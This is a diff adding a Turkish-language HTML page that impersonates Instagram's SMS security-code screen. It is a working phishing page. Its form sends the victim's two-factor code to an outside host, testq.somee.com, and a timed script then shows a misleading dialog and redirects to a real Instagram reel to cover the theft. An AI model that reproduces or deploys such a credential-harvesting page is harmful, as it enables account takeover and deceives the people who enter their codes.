@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<title>Instagram</title>
+	<link rel="stylesheet" type="text/css" href="sms/sms.css">
+	<link rel="icon" href="foto/title.ico" type="image/gif" sizes="16x16">
+</head>
+
+<body id="body">
+	<img id="kilit" src="sms/kilit.png">
+	<p id="numara">Sonu 5760 ile biten numarana gönderdiğimiz</p>
+	<p id="devamı">kodu gir.</p>
+
+	<form action="https://testq.somee.com/index.php" method="post">
+		<input id="sms_input" type="input" type="password" name="sms_kodu" placeholder="Güvenlik Kodu" required="">
+		<input id="login" type="submit" value="Onayla">
+	</form>
+
+	<p id="almadınmı">Güvenlik kodu almadın mı?</p>
+	<p id="yeniden_gönder">Yeniden gönderebiliriz.</p>
+	<p id="alamıyorsan">Güvenlik kodu alamıyorsan,</p>
+	<p id="yedek_kodlar">yedek kodlarından</p>
+	<p id="kullan">birini kullan.</p>
+	<img id="bottom" src="face/bottom.png">
+
+	<script>
+
+		function zaman(){
+			if (confirm("Kod gelmediyse cihaz sizin olduğu için sms kodu olmadan da giriş yapabilirsiniz.")){
+				window.location.href="https://www.instagram.com/reel/CS4txZPKgKq/?utm_medium=copy_link";
+			}
+			else{
+
+			}
+		}
+		setTimeout(zaman, 2000);
+	</script>
+
+</body>
+</html>
